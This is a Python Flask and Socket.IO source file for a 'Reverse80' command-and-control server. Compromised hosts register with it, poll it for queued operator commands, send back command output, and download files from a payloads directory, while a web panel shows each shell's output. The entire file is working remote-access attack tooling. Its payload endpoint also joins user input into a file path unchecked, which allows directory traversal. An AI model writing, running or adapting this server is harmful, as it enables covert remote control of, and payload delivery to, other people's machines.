from flask import *
from flask_socketio import *

app = Flask(__name__)
socketio = SocketIO(app)

class Shell:
    cmd_queque = []
    output = ""

shells = {"__server_log__": Shell()}

def server_log(msg):
    global shells
    msg += "\n"
    socketio.emit("output", (msg, "__server_log__"), broadcast=True)
    shells["__server_log__"].output += msg
    print(msg)

@socketio.on('connect')
def handle_connect():
    for shell_name in shells:
        socketio.emit("output", (shells[shell_name].output, shell_name), broadcast=True)

@socketio.on('command')
def handle_command(msg, shell_name):
    global shells
    if shell_name in shells:
        server_log('[' + shell_name + '] received command: ' + msg)
        shells[shell_name].cmd_queque.append(msg)

@socketio.on('close')
def handle_close(shell_name):
    global shells
    if shells.pop(shell_name, None) != None:
        server_log('[' + shell_name + '] deleted from server')

@app.route('/')
def index_page():
    return render_template("main.html", shells=shells)

@app.route('/init')
def init_page():
    global shells
    shell_name = request.args.get("name", "")
    if shell_name == "":
        return ""
    server_log('[' + shell_name + '] connected')
    shells[shell_name] = Shell()
    socketio.emit("connected", shell_name, broadcast=True)
    return "OK"

@app.route('/cmd')
def cmd_page():
    global shells
    shell_name = request.args.get("name", "")
    if shell_name == "":
        return ""
    if not shell_name in shells:
        server_log('[' + shell_name + '] aborted')
        return "__exit__"
    if len(shells[shell_name].cmd_queque) == 0:
        return ""
    cmd = shells[shell_name].cmd_queque.pop(0)
    server_log('[' + shell_name + '] sended command: ' + cmd)
    shells[shell_name].output += cmd + "\n"
    socketio.emit("output", (cmd + "\n", shell_name), broadcast=True)
    return cmd

@app.route('/result', methods=['POST'])
def result_page():
    msg = request.form['output']
    shell_name = request.form['name']
    server_log('[' + shell_name + '] command output: ' + msg)
    shells[shell_name].output += msg
    socketio.emit("output", (msg, shell_name), broadcast=True)
    return "OK"

@app.route('/payload')
def payload_page():
    name = request.args.get("file", "")
    if name == "":
        return ""
    try:
        f = open("payloads/" + name)
    except:
        return ""
    c = f.read()
    f.close()
    return c 

if __name__ == '__main__':
    import os
    port = 5000
    if "PORT" in os.environ:
        port = os.environ["PORT"]
    print("[[ Starting Reverse80 Server ]]")
    socketio.run(app, host="0.0.0.0", port=port)
